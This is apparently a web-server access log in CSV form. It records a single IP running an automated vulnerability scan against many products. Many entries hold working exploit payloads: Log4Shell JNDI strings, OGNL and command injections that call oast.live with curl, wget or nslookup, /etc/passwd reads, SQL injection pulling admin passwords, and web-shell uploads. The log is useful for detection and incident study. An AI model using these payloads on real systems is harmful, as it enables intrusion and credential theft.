"uri","query_string","request_ip","method"
"/apisix/batch-requests","-","148.135.107.254","POST"
"/","class.module.classLoader.resources.context.configFile=http://cl82amo80ssu2h3kcjs0ynnpr3gm6az9o.oast.live&class.module.classLoader.resources.context.configFile.content.aaa=xxx","148.135.107.254","GET"
"/actuator/gateway/routes/2Y3POOl0VNZ2Nz6IvWFEsMH7QLF","-","148.135.107.254","POST"
"/aj.html","a=devi","148.135.107.254","GET"
"/actuator/gateway/refresh","-","148.135.107.254","POST"
"/wp-admin/admin-post.php","vrc_cmd=phpinfo","148.135.107.254","GET"
"/vcac/","-","148.135.107.254","GET"
"/OA_HTML/BneViewerXMLService","bne:uueupload=TRUE","148.135.107.254","POST"
"/Admin/Access/Setup/Default.aspx","Action=createadministrator&adminusername=ZgKHQQ&adminpassword=yCD2sr&adminemail=test@test.com&adminname=test","148.135.107.254","GET"
"/zabbix/index_sso.php","-","148.135.107.254","GET"
"/plugin","-","148.135.107.254","GET"
"/geoserver/wms","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","location=search","148.135.107.254","GET"
"/sap/admin/public/default.html","-","148.135.107.254","GET"
"/login","redirect=%252F","148.135.107.254","GET"
"/vcac/","original_uri=https://clicktrans.pl%252Fvcac","148.135.107.254","GET"
"/users/user-dark-features","-","148.135.107.254","POST"
"/index_sso.php","-","148.135.107.254","GET"
"/admin/uploads.php","id=1","148.135.107.254","POST"
"/%2524%257B%2528%2523a%253D%2540org.apache.commons.io.IOUtils%2540toString%2528%2540java.lang.Runtime%2540getRuntime%2528%2529.exec%2528%2522whoami%2522%2529.getInputStream%2528%2529%252C%2522utf-8%2522%2529%2529.%2528%2540com.opensymphony.webwork.ServletActionContext%2540getResponse%2528%2529.setHeader%2528%2522X-Cmd-Response%2522%252C%2523a%2529%2529%257D/","-","148.135.107.254","GET"
"/logfile","d=crossdomain.xml","148.135.107.254","GET"
"/cgi-bin-hax/ExportSettings.sh","-","148.135.107.254","GET"
"/dologin.action","-","148.135.107.254","POST"
"/OASREST/v2/authenticate","-","148.135.107.254","POST"
"/page","id=2Y3PNqO9UNeaWvf2pa4B2jibRcS&settings%5Bview%2520options%5D%5BoutputFunctionName%5D=x;process.mainModule.require(%2527child_process%2527).execSync(%2527wget+http://cl82amo80ssu2h3kcjs0wo9z7fda3eajz.oast.live%2527);s","148.135.107.254","GET"
"/app/options.py","-","148.135.107.254","POST"
"/backupsettings.dat","-","148.135.107.254","GET"
"/vendor/htmlawed/htmlawed/htmLawedTest.php","-","148.135.107.254","POST"
"/ajax/openvpn/del_ovpncfg.php","-","148.135.107.254","POST"
"/controller/ping.php","-","148.135.107.254","POST"
"/api/v2/cmdb/system/admin","-","148.135.107.254","GET"
"/","class.module.classLoader.resources.context.configFile=https://cl82amo80ssu2h3kcjs0ig7sft79g919j.oast.live&class.module.classLoader.resources.context.configFile.content.aaa=xxx","148.135.107.254","GET"
"/service/extension/backup/mboximport","account-name=admin&account-status=1&ow=cmd","148.135.107.254","POST"
"/pfblockerng/www/index.php","-","148.135.107.254","GET"
"/api/2Y3PNkzie2PWIcv4cJbQpjfvNgO","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/conf_mail.php","-","148.135.107.254","POST"
"/card_scan.php","No=123&ReaderNo=%60sleep%25207%60&CardFormatNo=123","148.135.107.254","GET"
"/actuator/gateway/routes/2Y3POOl0VNZ2Nz6IvWFEsMH7QLF","-","148.135.107.254","DELETE"
"/api/content/","-","148.135.107.254","POST"
"/api/agent/tabs/agentData","-","148.135.107.254","POST"
"/fileupload/toolsAny","-","148.135.107.254","POST"
"/xmlrpc","-","148.135.107.254","POST"
"/%2524%257B%2540java.lang.Runtime%2540getRuntime%2528%2529.exec%2528%2522nslookup%2520cl82amo80ssu2h3kcjs0t8xkug3fnpsdm.oast.live%2522%2529%257D/","-","148.135.107.254","GET"
"/ztp/cgi-bin/handler","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"//interactsh.com%252f..","-","148.135.107.254","GET"
"/wp-admin/admin-ajax.php","action=loginas_return_admin","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/login/index.php","login=$(ping$%7BIFS%7D-nc$%7BIFS%7D2$%7BIFS%7D%60whoami%60.cl82amo80ssu2h3kcjs06ct5rezh3hrdh.oast.live)","148.135.107.254","POST"
"/wp-admin/users.php","-","148.135.107.254","GET"
"/js/jquery_file_upload/server/php/","-","148.135.107.254","POST"
"/csrf","-","148.135.107.254","GET"
"/SamlResponseServlet","-","148.135.107.254","POST"
"/service/extension/backup/mboximport","account-name=admin&ow=2&no-switch=1&append=1","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL","148.135.107.254","GET"
"/api/scrape/kube-system","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/webapi/auth","-","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","action=cfom_upload_file&name=2Y3POaxVANE9PArrDbYKvGu9sCT.pHp","148.135.107.254","POST"
"/cgi-bin/popen.cgi","command=cat%2520/etc/passwd&v=0.1303033443137912","148.135.107.254","GET"
"/api/v2/cmdb/system/admin/admin","-","148.135.107.254","PUT"
"/wp-content/uploads/cfom_files/2y3poaxvane9parrdbykvgu9sct.php","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/admin/login/index.php","-","148.135.107.254","GET"
"/accounts/login/","-","148.135.107.254","GET"
"/setup/setupadministrator-start.action","-","148.135.107.254","GET"
"/downloader.php","file=%253Becho+CVE-2023-23333%7Crev%2500.zip","148.135.107.254","GET"
"/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php","-","148.135.107.254","POST"
"/kubepi/api/v1/users","-","148.135.107.254","POST"
"/forms/doLogin","login_username=admin&password=password$(curl%2520cl82amo80ssu2h3kcjs0ednmqq4m3mt91.oast.live)&x=0&y=0","148.135.107.254","GET"
"/session/login","-","148.135.107.254","GET"
"/wp-json/wp/v2/add-listing","id=1","148.135.107.254","GET"
"/%252577eb%252575i_%252577sma_Http","-","148.135.107.254","POST"
"/api/v1/clusters/kubeconfig/k8s","-","148.135.107.254","GET"
"/","url=%3Cimg/src=%22http://cl82amo80ssu2h3kcjs0kpgt334tteaqn.oast.live%22%3E","148.135.107.254","GET"
"/spip.php","page=spip_pass","148.135.107.254","GET"
"/api/v1/database/1","-","148.135.107.254","GET"
"/cgi-bin/popen.cgi","command=type%2520C://Windows/win.ini&v=0.1303033443137912","148.135.107.254","GET"
"/json/setup-restore.action","-","148.135.107.254","POST"
"/ajax/api/user/save","-","148.135.107.254","POST"
"///CFIDE/adminapi/accessmanager.cfc","method=foo&_cfclient=true","148.135.107.254","POST"
"/api/v1/database/1","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/setup/setupadministrator-start.action","-","148.135.107.254","GET"
"/aspera/faspex/package_relay/relay_package","-","148.135.107.254","POST"
"/app","-","148.135.107.254","POST"
"/server-info.action","bootstrapStatusProvider.applicationConfig.setupComplete=0&cache2Y3PO99iDP7QWGb81IFc3NidGbj","148.135.107.254","GET"
"/flash/addcrypted2","-","148.135.107.254","POST"
"/saas./resttosaasservlet","-","148.135.107.254","POST"
"/setup/setupadministrator.action","-","148.135.107.254","POST"
"/flash/addcrypted2","-","148.135.107.254","GET"
"/index.php","c=blocked&action=continue","148.135.107.254","POST"
"/wp-login.php","-","148.135.107.254","GET"
"/app","service=page/SetupCompleted","148.135.107.254","GET"
"/api/hassio/app/.%25252e/supervisor/info","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/api/hassio/app/.%2509./supervisor/info","-","148.135.107.254","GET"
"/_api/web/siteusers","-","148.135.107.254","GET"
"/cgi-bin/cstecgi.cgi","-","148.135.107.254","POST"
"/Servlet/Skins","-","148.135.107.254","POST"
"/wp-admin/profile.php","-","148.135.107.254","GET"
"/app","-","148.135.107.254","POST"
"/inc/jquery/uploadify/uploadify.php","-","148.135.107.254","POST"
"/ws/msw/tenant/%2527%2520union%2520select%2520%2528select%2520ID%2520from%2520SGMSDB.DOMAINS%2520limit%25201%2529%252C%2520%2527%2527%252C%2520%2527%2527%252C%2520%2527%2527%252C%2520%2527%2527%252C%2520%2527%2527%252C%2520%2528select%2520concat%2528id%252C%2520%2527%253A%2527%252C%2520password%2529%2520from%2520sgmsdb.users%2520where%2520active%2520%253D%2520%25271%2527%2520order%2520by%2520issuperadmin%2520desc%2520limit%25201%2520offset%25200%2529%252C%2527%2527%252C%2520%2527%2527%252C%2520%2527","-","148.135.107.254","GET"
"/dologin.action","-","148.135.107.254","POST"
"/api/hassio_ingress/.%2509./supervisor/info","-","148.135.107.254","GET"
"/api/v1/database/1","-","148.135.107.254","GET"
"/api/runscript","-","148.135.107.254","POST"
"/2Y3PNbdaWnJe0J6A2doUpggVTRK","-","148.135.107.254","GET"
"/wp-content/plugins/ultimate-member/readme.txt","-","148.135.107.254","GET"
"/main/webservices/additional_webservices.php","-","148.135.107.254","POST"
"/mifs/asfV3/api/v2/admins/users","-","148.135.107.254","GET"
"/_api/web/siteusers","-","148.135.107.254","GET"
"/appliance/login","-","148.135.107.254","GET"
"/app","-","148.135.107.254","POST"
"/attachment/404/abbba.php","-","148.135.107.254","POST"
"/getsamplebacklog","arg1=2d0ows2x9anpzaorxi9h4csmai08jjor&arg2=%257b%2522type%2522%253a%2522client%2522%252c%2522earliest%2522%253a%25221676976316.328%257c%257cnslookup%2520%2524(xxd%2520-pu%2520%253c%253c%253c%2520%2524(whoami)).cl82amo80ssu2h3kcjs0a9zingato5oqi.oast.live%257c%257cx%2522%252c%2522latest%2522%253a1676976916.328%252c%2522origins%2522%253a%255b%257b%2522ip%2522%253a%2522clicktrans.pl%2522%252c%2522source%2522%253a0%257d%255d%252c%2522seriesID%2522%253a3%257d&arg3=undefined&arg4=undefined&arg5=undefined&arg6=undefined&arg7=undefined","148.135.107.254","GET"
"/v1/folder","path=%252F","148.135.107.254","GET"
"/api/session/properties","-","148.135.107.254","GET"
"/api/v1/database/2","-","148.135.107.254","GET"
"/app/rest/users/id:1/tokens/RPC2","-","148.135.107.254","DELETE"
"/app","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/app","-","148.135.107.254","POST"
"/api/v1/database/1","-","148.135.107.254","GET"
"/","PHPRC=/dev/fd/0","148.135.107.254","POST"
"/pig/add-pig.php","-","148.135.107.254","POST"
"/api/v1/database/2","-","148.135.107.254","GET"
"/file-manager/backend/makefile","-","148.135.107.254","POST"
"/index.php","-","148.135.107.254","POST"
"/welcome.action","-","148.135.107.254","GET"
"/","rest_route=/wp/v2/users","148.135.107.254","GET"
"/sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index","-","148.135.107.254","POST"
"/api/v1/database/1","-","148.135.107.254","GET"
"/_images/YhOPVW","-","148.135.107.254","GET"
"/mifs/aad/api/v2/admins/users","-","148.135.107.254","GET"
"/api/users","-","148.135.107.254","POST"
"/file-manager/backend/text","-","148.135.107.254","POST"
"/app/rest/users/id:1/tokens/RPC2","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/login/userverify.cgi","-","148.135.107.254","POST"
"/mgmt/tm/auth/user/O3FEi","-","148.135.107.254","PATCH"
"/api/v1/database/2","-","148.135.107.254","GET"
"/api/server/version","-","148.135.107.254","GET"
"/mics/services/MICSLogService","-","148.135.107.254","POST"
"/emap/devicePoint_addImgIco","hasSubsystem=true","148.135.107.254","POST"
"/wp-json/wp/v2/users/","-","148.135.107.254","GET"
"/api/setup/validate","-","148.135.107.254","POST"
"/api/v1/database/2","-","148.135.107.254","GET"
"/app","service=page/PrinterList","148.135.107.254","GET"
"/login.php","-","148.135.107.254","GET"
"/file-manager/","-","148.135.107.254","GET"
"/v1/folder","path=%252F","148.135.107.254","GET"
"/nagiosxi/login.php","-","148.135.107.254","GET"
"/feed/","-","148.135.107.254","GET"
"/author-sitemap.xml","-","148.135.107.254","GET"
"/cgi-bin/vitogate.cgi","-","148.135.107.254","POST"
"/file-manager/backend/permissions","-","148.135.107.254","POST"
"/dview8/api/usersByLevel","-","148.135.107.254","GET"
"/2AvesbzTal.php","-","148.135.107.254","GET"
"/forms/doLogin","-","148.135.107.254","POST"
"/api/v1/database/2","-","148.135.107.254","GET"
"/concrete5/index.php/install","-","148.135.107.254","GET"
"/jquery-file-upload/server/php/","-","148.135.107.254","GET"
"/api/v1/database/3","-","148.135.107.254","GET"
"/admin%2520/db","-","148.135.107.254","GET"
"/ws/v1/cluster/apps/new-application","-","148.135.107.254","POST"
"/mgmt/tm/util/bash","-","148.135.107.254","POST"
"/clusterList","-","148.135.107.254","GET"
"/zp-core/setup/index.php","-","148.135.107.254","GET"
"/mgmt/shared/authn/login","-","148.135.107.254","POST"
"/groovyconsole","-","148.135.107.254","GET"
"/cgi-bin/ExportSettings.sh","-","148.135.107.254","GET"
"/setup/install.php","-","148.135.107.254","GET"
"/etc/groovyconsole.html","-","148.135.107.254","GET"
"/install","-","148.135.107.254","GET"
"/wp-admin/install.php","step=1","148.135.107.254","GET"
"/index.php/install","-","148.135.107.254","GET"
"/upload/setup/install.php","-","148.135.107.254","GET"
"/.tugboat","-","148.135.107.254","GET"
"/html/setup.html","-","148.135.107.254","GET"
"/admin/install.php","-","148.135.107.254","GET"
"/mgmt/tm/auth/user/O3FEi","-","148.135.107.254","PATCH"
"/nacos/v1/auth/users","pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g","148.135.107.254","GET"
"/mgmt/shared/authn/login","-","148.135.107.254","POST"
"/api/v1/pods","-","148.135.107.254","GET"
"/v1/auth/users","pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g","148.135.107.254","GET"
"/lab/api/settings/","-","148.135.107.254","GET"
"/images/json","-","148.135.107.254","GET"
"/zp/zp-core/setup/index.php","-","148.135.107.254","GET"
"/api/v1/database/3","-","148.135.107.254","GET"
"/gallery/zp-core/setup/index.php","-","148.135.107.254","GET"
"/api/v1/database/3","-","148.135.107.254","GET"
"/ipython/tree","-","148.135.107.254","GET"
"/web/database/manager","-","148.135.107.254","GET"
"/nacos/v1/auth/users","pageNo=1&pageSize=9","148.135.107.254","GET"
"/zenphoto/zp-core/setup/index.php","-","148.135.107.254","GET"
"/api/v1/database/3","-","148.135.107.254","GET"
"/pods","-","148.135.107.254","GET"
"/IdKnVi","-","148.135.107.254","GET"
"/v1/auth/users","pageNo=1&pageSize=9","148.135.107.254","GET"
"/solr/gettingstarted_shard1_replica_n1/config","-","148.135.107.254","POST"
"/solr/admin/collections","action=%2524%257Bjndi%253Aldap%253A%252F%252F%2524%257B%253A-470%257D%2524%257B%253A-488%7D%257D.%2524%257BhostName%257D.uri.cl82amo80ssu2h3kcjs0reinnryghe3cn.oast.live%252F%257D","148.135.107.254","GET"
"/webui/logoutconfirm.html","logon_hash=1","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/dashboard/proc.php","type=login","148.135.107.254","POST"
"/http/index.php","-","148.135.107.254","POST"
"/c42api/v3/LoginConfiguration","username=$%7Bjndi:ldap://$%7B:-610%7D$%7B:-879%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0sn8t1amtrria4.oast.live/test%7D&url=https://localhost","148.135.107.254","GET"
"/api/v1/database/4","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/runners/start","-","148.135.107.254","POST"
"/ccmadmin/j_security_check","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/solr/admin/cores","action=%2524%257Bjndi%253Aldap%253A%252F%252F%2524%257B%253A-470%257D%2524%257B%253A-488%7D%257D.%2524%257BhostName%257D.uri.cl82amo80ssu2h3kcjs091p6wyenzmx74.oast.live%252F%257D","148.135.107.254","GET"
"/suite-auth/login","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/plus/flink.php","dopost=save&c=cat%2520/etc/passwd","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/api/v1/database/4","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/users/sign_in","-","148.135.107.254","GET"
"/WebReport/ReportServer","op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/T0oCLE7p.jsp","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/api/v1/repos/search","limit=1","148.135.107.254","GET"
"/j_security_check","-","148.135.107.254","POST"
"/api/v1/database/5","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/druid/coordinator/v1/lookups/config/$%257bjndi:ldap:%252f%252fcl82amo80ssu2h3kcjs0k5hrho1fuh51p.oast.live%252ftea%257d","-","148.135.107.254","DELETE"
"/showfile.php","file=/etc/passwd","148.135.107.254","GET"
"/api/v1/database/5","-","148.135.107.254","GET"
"/api/system/sessions","-","148.135.107.254","POST"
"/api/v1/database/5","-","148.135.107.254","GET"
"/fsms/fsmsh.dll","FSMSCommand=$%7Bjndi:ldap://$%7B:-657%7D$%7B:-251%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0hr6gz7qkfab94.oast.live/r7vrv%7D","148.135.107.254","GET"
"/ocpu/library/base/R/do.call/json","-","148.135.107.254","POST"
"/jenkins/script","-","148.135.107.254","GET"
"/api/v1/database/5","-","148.135.107.254","GET"
"/_search","a=$%257Bjndi%253Aldap%253A%252F%252F$%257B%253A-505%257D$%257B%253A-347%257D.$%257BhostName%257D.search.cl82amo80ssu2h3kcjs03j4y9jwdouonm.oast.live%257D","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/script/","-","148.135.107.254","GET"
"/data/manage/cmd.php","cmd=id","148.135.107.254","GET"
"/mifs/j_spring_security_check","-","148.135.107.254","POST"
"/Upload/test/2Y3POARRKli4z9YhyN3XjNw40b3.php","-","148.135.107.254","GET"
"/api/system/deviceinfo","-","148.135.107.254","GET"
"/webmail/basic/","-","148.135.107.254","POST"
"/api/v1/database/6","-","148.135.107.254","GET"
"/api/geojson","url=$%7Bjndi:ldap://$%7B:-300%7D$%7B:-638%7D.$%7BhostName%7D.url.cl82amo80ssu2h3kcjs0ak1ymxtghaegg.oast.live%7D","148.135.107.254","GET"
"/v1/agent/service/register","-","148.135.107.254","PUT"
"/db_dump.php","-","148.135.107.254","GET"
"/v2/query","-","148.135.107.254","POST"
"/Upload/upload_file.php","l=test","148.135.107.254","POST"
"/flexnet/logon.do","-","148.135.107.254","POST"
"/api/v1/database/5","-","148.135.107.254","GET"
"/plugin/customMethod","-","148.135.107.254","POST"
"/goanywhere/auth/Login.xhtml","-","148.135.107.254","GET"
"/api/v1/database/6","-","148.135.107.254","GET"
"/cgi-bin/login.cgi","-","148.135.107.254","POST"
"/nacos/v1/auth/users","pageNo=1&pageSize=9","148.135.107.254","GET"
"/api/v1/database/6","-","148.135.107.254","GET"
"/login/SAML","=$%7Bjndi:ldap://$%7B:-813%7D$%7B:-985%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0mjajuipahy5i1.oast.live/ni8wp%7D","148.135.107.254","GET"
"/Login","-","148.135.107.254","POST"
"/api/v1/database/6","-","148.135.107.254","GET"
"/api/logstash/pipeline/$%257Bjndi:ldap://$%257B:-992%257D$%257B:-240%257D.$%257BhostName%257D.username.cl82amo80ssu2h3kcjs0yrrjxhthcggmo.oast.live/NOTsC%257D","-","148.135.107.254","GET"
"/login","-","148.135.107.254","POST"
"/fpc/login/","-","148.135.107.254","POST"
"/http-bind","room=$%7Bjndi:ldap://$%7B:-156%7D$%7B:-734%7D.$%7BhostName%7D.username.cl82amo80ssu2h3kcjs0f8jimdu8zewtr.oast.live/bCu6W%7D","148.135.107.254","GET"
"/sysShell","-","148.135.107.254","POST"
"/manager/radius/server_ping.php","ip=127.0.0.1%7Ccat%2520/etc/passwd%3E../../2Y3PO9kdbwooMYGliBpawFeQF9q.txt&id=1","148.135.107.254","GET"
"/2Y3PO9kdbwooMYGliBpawFeQF9q.txt","-","148.135.107.254","GET"
"/two_fact_auth","-","148.135.107.254","POST"
"/debug.php","-","148.135.107.254","POST"
"/AdminPage/conf/runCmd","cmd=id","148.135.107.254","GET"
"/lcms/index.php","-","148.135.107.254","POST"
"/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc","-","148.135.107.254","POST"
"/index.php","-","148.135.107.254","POST"
"/app","-","148.135.107.254","POST"
"/tool/log/c.php","strip_slashes=system&host=ipconfig","148.135.107.254","GET"
"/api/v1/database/6","-","148.135.107.254","GET"
"/upgrade_handle.php","cmd=writeuploaddir&uploaddir=%2527;whoami;%2527","148.135.107.254","GET"
